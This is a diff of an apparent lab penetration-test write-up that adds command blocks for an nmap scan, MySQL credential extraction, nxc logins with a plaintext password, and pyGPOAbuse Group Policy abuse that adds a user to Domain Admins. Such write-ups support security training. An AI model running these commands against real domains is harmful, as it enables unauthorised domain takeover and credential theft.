@@ -38,7 +38,13 @@ The whole attack chains together a few separate weaknesses, one after another:
 
 ## 3.0 Reconnaissance — Initial Network Enumeration
 
-We ran a full TCP port scan with version detection against all three machines (total time 5m 32s). The full output is in the screenshots below; here is a short summary.
+We ran a full TCP port scan with version detection against all three machines (total time 5m 32s):
+
+```bash
+nmap -p- -sC -sV -Pn -n 192.168.216.95 192.168.216.96 192.168.216.97
+```
+
+The full output is in the screenshots below; here is a short summary.
 
 ### 3.1 VM3 (192.168.216.95) — ManageEngine Application Server
 
@@ -282,9 +288,7 @@ era\administrator
 
 ---
 
-## 8.0 Post-Exploitation & Domain Enumeration
-
-### 8.1 Credential Dumping with secretsdump
+## 8.0 Credential Dumping with secretsdump
 
 Now that we are Administrator, the next goal is to collect credentials to reach the Domain Controller. Windows keeps secrets in a few places — the SAM (local account hashes) and LSA (service-account passwords, stored in a readable form).
 
@@ -312,30 +316,20 @@ Two useful things came out:
 
 No cached domain logins on ERA.
 
-### 8.2 Domain Enumeration with adscan
-
-Next we map the domain — who has what permissions, and where the paths to Domain Admin are.
-
-We used our own tool `adscan`:
-
-```bash
-adscan scan --domain secura.yzx --dc-ip 192.168.216.97 --username Eric.Wallows --password 'EricLikesRunning800' --mode full -o reports/
-```
-
-Key findings:
-
-- **Zerologon (CVE-2020-1472)** — possible exposure on `DC01`.
-- **`Admin` is a member of `Administrators`** — a path to Domain Admins if we get that account's password.
-- **GPP (cpassword)** in SYSVOL — possible cleartext credentials.
-- **SMB/LDAP signing disabled** and **`MachineAccountQuota = 10`**. No AD CS.
-
 ---
 
 ## 9.0 Domain Compromise
 
 ### 9.1 charlotte's Credentials — from the MySQL creds table
 
-We already had MySQL root access on ERA (from the UDF escalation in section 7.0). While digging for more credentials, we found a database called `creds` that does not exist in a standard XAMPP install. It held a single table with two plaintext passwords:
+We already had MySQL root access on ERA (from the UDF escalation in section 7.0). While digging for more credentials, we queried the databases and found one called `creds` that does not exist in a standard XAMPP install:
+
+```powershell
+C:\xampp\mysql\bin\mysql.exe -u root -e "SHOW DATABASES;"
+C:\xampp\mysql\bin\mysql.exe -u root -e "SELECT * FROM creds.creds;"
+```
+
+It held a single table with two plaintext passwords:
 
 ```
 name          pass
@@ -347,7 +341,14 @@ The `administrator` entry matched the password we had already recovered from LSA
 
 ### 9.2 GPO Abuse — charlotte to Domain Admins
 
-We tested charlotte's password against the Domain Controller and got a valid WinRM session. A first DCSync attempt as charlotte failed (she held only partial replication rights), but the expected path was GPO abuse: charlotte has **WriteOwner on the Default Domain Policy** (GUID `{31B2F340-016D-11D2-945F-00C04FB984F9}`).
+We tested charlotte's password against the Domain Controller and got a valid WinRM session:
+
+```bash
+nxc smb 192.168.216.97 -u 'charlotte' -p 'Game2On4.!'
+nxc winrm 192.168.216.97 -u 'charlotte' -p 'Game2On4.!'
+```
+
+A first DCSync attempt as charlotte failed (she held only partial replication rights), but the expected path was GPO abuse: charlotte has **WriteOwner on the Default Domain Policy** (GUID `{31B2F340-016D-11D2-945F-00C04FB984F9}`).
 
 We used `pyGPOAbuse` to plant a scheduled task inside the Default Domain Policy that adds charlotte to Domain Admins:
 
@@ -355,7 +356,13 @@ We used `pyGPOAbuse` to plant a scheduled task inside the Default Domain Policy 
 python3 pygpoabuse.py secura.yzx/charlotte:'Game2On4.!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net group "Domain Admins" charlotte /add /domain' -dc-ip 192.168.216.97
 ```
 
-We then forced the policy to apply with `gpupdate /force` from charlotte's WinRM shell on the DC. The scheduled task ran as SYSTEM on the Domain Controller and added charlotte to the Domain Admins group.
+We then forced the policy to apply from charlotte's WinRM shell on the DC:
+
+```powershell
+gpupdate /force
+```
+
+The scheduled task ran as SYSTEM on the Domain Controller and added charlotte to the Domain Admins group.
 
 ### 9.3 DCSync — Full Domain Compromise
 
